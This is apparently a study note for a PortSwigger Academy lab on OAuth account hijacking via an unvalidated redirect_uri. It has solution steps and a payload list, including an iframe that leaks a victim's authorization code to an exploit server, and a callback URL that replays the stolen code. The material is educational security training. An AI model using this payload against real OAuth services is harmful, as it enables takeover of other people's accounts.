# Lab: OAuth account hijacking via redirect_uri

**Official PortSwigger URL:** https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri

**Lab idea:** This challenge focuses on an OAuth provider whose redirect URI handling can expose another user's authorization code. It practices recognizing how weak callback validation can put account identity and authorization data at risk.

## Vulnerability in brief
OAuth is a framework for delegated access; applications also use OAuth flows to sign users in through an identity held by another service. This Academy section is a **vulnerability topic**, not a general learning or testing category. It focuses on security failures in OAuth-based authentication and related OpenID Connect implementations.

## Solution idea
1. While proxying traffic through Burp, click "My account" and complete the OAuth login process.
2. Log out and then log back in again.
3. In Burp, study the OAuth flow in the proxy history and identify the most recent authorization request.
4. In Burp Repeater, observe that you can submit any arbitrary value as the redirect_uri without encountering an error.
- …
6. Store the exploit and click "View exploit".
7. Deliver the exploit to the victim, then go back to the access log and copy the victim's code from the resulting request.
8. Log out of the blog website and then use the stolen code to navigate to: https://YOUR-LAB-ID.web-security-academy.net/oauth-callback?code=STOLEN-CODE The rest of the OAuth flow will be…

## Payloads / key values
- `GET /auth?client_id=[...]`
- `redirect_uri`
- `iframe`
- `/exploit`
- `<iframe src="https://oauth-YOUR-LAB-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>`
- `https://YOUR-LAB-ID.web-security-academy.net/oauth-callback?code=STOLEN-CODE`
- `carlos`

## Official source
- [PortSwigger Academy: Lab: OAuth account hijacking via redirect_uri](https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri)
